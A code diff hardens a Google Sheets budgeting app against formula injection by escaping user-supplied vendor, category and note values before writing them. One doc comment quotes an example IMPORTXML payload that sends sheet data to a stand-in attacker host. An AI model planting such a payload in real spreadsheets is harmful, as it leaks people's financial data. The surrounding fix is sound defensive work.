@@ -37,6 +37,42 @@ export const CATEGORIES = [
 
 const colLetter = (i) => String.fromCharCode(65 + i);
 
+/**
+ * Force a value to be treated as literal text by Google Sheets, even when the
+ * cell is written with valueInputOption=USER_ENTERED. Cells starting with
+ * `= + - @ \t \r \n` would otherwise be interpreted as formulas — a vendor
+ * name like `=IMPORTXML("https://attacker/?d="&Totals!A1:Z30,"/x")` would
+ * exfiltrate sheet data when the cell loads. Prefixing with a single quote
+ * tells Sheets "this is plain text"; the apostrophe is hidden in the UI and
+ * stripped on read.
+ *
+ * Pass through non-strings and empty strings unchanged so formula and numeric
+ * writes are unaffected.
+ */
+export function safeText(value) {
+  if (typeof value !== 'string' || value.length === 0) return value;
+  const c = value.charCodeAt(0);
+  // = + - @  CR LF TAB
+  if (c === 0x3d || c === 0x2b || c === 0x2d || c === 0x40 ||
+      c === 0x0d || c === 0x0a || c === 0x09) {
+    return "'" + value;
+  }
+  return value;
+}
+
+// Escape an identifier interpolated inside a Sheets formula sheet-ref like
+// `='${name}'!F1`. A stray apostrophe would close the ref early; doubling it
+// is the documented Sheets escape.
+function escapeSheetRef(name) {
+  return String(name).replace(/'/g, "''");
+}
+
+// Escape an identifier interpolated inside a formula string literal like
+// `=SUMIF(..., "${name}", ...)`. Sheets escapes `"` as `""`.
+function escapeFormulaString(name) {
+  return String(name).replace(/"/g, '""');
+}
+
 // ── Transaction UUID ──────────────────────────────────────────────────────────
 
 /**
@@ -148,7 +184,8 @@ export async function writeSalary(sheetId, salary, accessToken) {
 
 export async function updateCategoryBudget(sheetId, accessToken, { rowNum, budget, categoryName }) {
   // C column stores the remaining formula: ={budget}-B{rowNum}
-  await writeCell(sheetId, 'Totals', rowNum, 2, `=${budget}-B${rowNum}`, accessToken);
+  // Coerce budget to a number so a stringy value can't escape the formula.
+  await writeCell(sheetId, 'Totals', rowNum, 2, `=${Number(budget) || 0}-B${rowNum}`, accessToken);
   await appendHistoryEntry(sheetId, accessToken, {
     action: 'Budget Updated',
     category: categoryName,
@@ -171,7 +208,7 @@ export async function appendRandomExpenseNote(sheetId, vendorName, amount, acces
   const entries = existing ? existing.split(',').map(e => e.trim()) : [];
   if (entries.some(e => e.toLowerCase() === vendorName.trim().toLowerCase())) return;
   const newText = existing ? `${existing}, ${vendorName}` : vendorName;
-  await writeCell(sheetId, 'Totals', notesRow.rowNum, 8, newText, accessToken);
+  await writeCell(sheetId, 'Totals', notesRow.rowNum, 8, safeText(newText), accessToken);
 }
 
 export async function removeRandomExpenseNote(sheetId, vendorName, accessToken) {
@@ -181,7 +218,7 @@ export async function removeRandomExpenseNote(sheetId, vendorName, accessToken) 
   const existing = String(notesRow.row[8] || '').trim();
   if (!existing) return;
   const filtered = existing.split(',').map(e => e.trim()).filter(e => e.toLowerCase() !== vendorName.trim().toLowerCase());
-  await writeCell(sheetId, 'Totals', notesRow.rowNum, 8, filtered.join(', '), accessToken);
+  await writeCell(sheetId, 'Totals', notesRow.rowNum, 8, safeText(filtered.join(', ')), accessToken);
 }
 
 export async function renameRandomExpenseNote(sheetId, oldName, newName, accessToken) {
@@ -203,7 +240,7 @@ export async function renameRandomExpenseNote(sheetId, oldName, newName, accessT
   await apiFetch(sheetId, `/values/${range}?valueInputOption=USER_ENTERED`, {
     method: 'PUT',
     headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
-    body: JSON.stringify({ values: [[updated]] }),
+    body: JSON.stringify({ values: [[safeText(updated)]] }),
   });
 }
 
@@ -263,7 +300,7 @@ export async function markNonMonthly(sheetId, accessToken, vendor, amount) {
       await apiFetch(sheetId, `/values/${range}?valueInputOption=USER_ENTERED`, {
         method: 'PUT',
         headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
-        body: JSON.stringify({ values: [[vendor, amount, date]] }),
+        body: JSON.stringify({ values: [[safeText(vendor), amount, date]] }),
       });
     } else {
       // Find next empty row
@@ -272,7 +309,7 @@ export async function markNonMonthly(sheetId, accessToken, vendor, amount) {
       await apiFetch(sheetId, `/values/${range}?valueInputOption=USER_ENTERED`, {
         method: 'PUT',
         headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
-        body: JSON.stringify({ values: [[vendor, amount, date]] }),
+        body: JSON.stringify({ values: [[safeText(vendor), amount, date]] }),
       });
     }
   } catch (e) { console.warn('markNonMonthly failed:', e); }
@@ -396,7 +433,18 @@ export async function appendHistoryEntry(sheetId, accessToken, {
       userName = JSON.parse(raw).name || '';
     } catch { /* ignore */ }
     // Columns: A=Timestamp B=Action C=Category D=Vendor E=Amount F=Details G=(reserved) H=User I=UUID
-    const row = [timestamp, action || '', category || '', vendor || '', amount ?? '', details || '', '', userName, uuid || ''];
+    // safeText() prevents a malicious vendor/category/user value from being evaluated as a formula.
+    const row = [
+      timestamp,
+      safeText(action || ''),
+      safeText(category || ''),
+      safeText(vendor || ''),
+      amount ?? '',
+      safeText(details || ''),
+      '',
+      safeText(userName),
+      uuid || '',
+    ];
 
     // Use an explicit PUT to a calculated row number rather than the append API,
     // so all 8 columns are guaranteed to land in the correct cells.
@@ -518,7 +566,7 @@ export async function undoHistoryEntry(sheetId, accessToken, entry) {
           const newRow = Array(uuidCol + 1).fill('');
           newRow[0] = now.toLocaleString('en-US', { month: 'short' });
           newRow[1] = now.getFullYear();
-          newRow[config.descCol] = vendor;
+          newRow[config.descCol] = safeText(vendor);
           newRow[config.amtCol]  = amount;
           newRow[uuidCol]        = newUUID;
 
@@ -561,7 +609,7 @@ export async function undoHistoryEntry(sheetId, accessToken, entry) {
       const row = rows.find(r => r.description.toLowerCase() === vendor.toLowerCase());
       if (row) {
         const config = SHEET_MAP[category];
-        if (config) await writeCell(sheetId, config.sheet, row.rowIndex, config.descCol, oldName, accessToken);
+        if (config) await writeCell(sheetId, config.sheet, row.rowIndex, config.descCol, safeText(oldName), accessToken);
       }
     }
 
@@ -748,7 +796,7 @@ export async function addOrUpdateExpense(
     const newRow = Array(uuidCol + 1).fill('');
     newRow[0] = month;
     newRow[1] = year;
-    newRow[config.descCol] = vendorName;
+    newRow[config.descCol] = safeText(vendorName);
     newRow[config.amtCol]  = amount;
     newRow[uuidCol]        = newUUID;
 
@@ -777,7 +825,7 @@ export async function addOrUpdateExpense(
 export async function updateVendorName(categoryName, rowIndex, newName, accessToken, sheetId, oldName = '') {
   const config = getEffectiveSheetMap()[categoryName];
   if (!config) throw new Error(`Unknown category: ${categoryName}`);
-  await writeCell(sheetId, config.sheet, rowIndex, config.descCol, newName, accessToken);
+  await writeCell(sheetId, config.sheet, rowIndex, config.descCol, safeText(newName), accessToken);
   // Also update the non-monthly tile if this vendor was listed there
   // Rename in UserSettings is handled via onVendorRenamed callback in DetailPanel
   await appendHistoryEntry(sheetId, accessToken, {
@@ -952,7 +1000,7 @@ export async function renameCategory(sheetId, accessToken, { oldName, newName })
         await apiFetch(sheetId, `/values/${encodeURIComponent(`'Totals'!B${rowNum}`)}?valueInputOption=USER_ENTERED`, {
           method: 'PUT',
           headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
-          body: JSON.stringify({ values: [[`='${newName}'!F1`]] }),
+          body: JSON.stringify({ values: [[`='${escapeSheetRef(newName)}'!F1`]] }),
         });
       }
     } catch { /* non-fatal — tab rename best-effort */ }
@@ -980,12 +1028,12 @@ export async function renameCategory(sheetId, accessToken, { oldName, newName })
           await apiFetch(sheetId, `/values/${encodeURIComponent(`'${S}'!${colLetter(d)}${r}`)}?valueInputOption=USER_ENTERED`, {
             method: 'PUT',
             headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
-            body: JSON.stringify({ values: [[newName]] }),
+            body: JSON.stringify({ values: [[safeText(newName)]] }),
           });
           await apiFetch(sheetId, `/values/${encodeURIComponent(`'${S}'!${colLetter(a)}${r}`)}?valueInputOption=USER_ENTERED`, {
             method: 'PUT',
             headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
-            body: JSON.stringify({ values: [[`=SUMIF(Totals!A:A,"${newName}",Totals!B:B)`]] }),
+            body: JSON.stringify({ values: [[`=SUMIF(Totals!A:A,"${escapeFormulaString(newName)}",Totals!B:B)`]] }),
           });
           break;
         }
@@ -1049,7 +1097,7 @@ export async function linkCategoryToDetailSheet(sheetId, accessToken, { category
   await apiFetch(sheetId, `/values/${bRange}?valueInputOption=USER_ENTERED`, {
     method: 'PUT',
     headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
-    body: JSON.stringify({ values: [[`='${categoryName}'!F1`]] }),
+    body: JSON.stringify({ values: [[`='${escapeSheetRef(categoryName)}'!F1`]] }),
   });
 }
 
@@ -1083,7 +1131,7 @@ export async function addCategoryTo503020(sheetId, accessToken, { categoryName, 
   await apiFetch(sheetId, `/values/${descCell}?valueInputOption=USER_ENTERED`, {
     method: 'PUT',
     headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
-    body: JSON.stringify({ values: [[categoryName]] }),
+    body: JSON.stringify({ values: [[safeText(categoryName)]] }),
   });
 
   // Write formula that pulls the actual spend from the Totals sheet
@@ -1091,7 +1139,7 @@ export async function addCategoryTo503020(sheetId, accessToken, { categoryName, 
   await apiFetch(sheetId, `/values/${amtCell}?valueInputOption=USER_ENTERED`, {
     method: 'PUT',
     headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
-    body: JSON.stringify({ values: [[`=SUMIF(Totals!A:A,"${categoryName}",Totals!B:B)`]] }),
+    body: JSON.stringify({ values: [[`=SUMIF(Totals!A:A,"${escapeFormulaString(categoryName)}",Totals!B:B)`]] }),
   });
 }
 
@@ -1122,7 +1170,8 @@ export async function addCategoryToTotals(sheetId, accessToken, { name, budget }
   await apiFetch(sheetId, `/values/${writeRange}?valueInputOption=USER_ENTERED`, {
     method: 'PUT',
     headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
-    body: JSON.stringify({ values: [[name, 0, `=${budget}-B${rowNum}`]] }),
+    // budget is forced to Number so it can't be a string starting with =/+/etc.
+    body: JSON.stringify({ values: [[safeText(name), 0, `=${Number(budget) || 0}-B${rowNum}`]] }),
   });
 
   return rowNum;
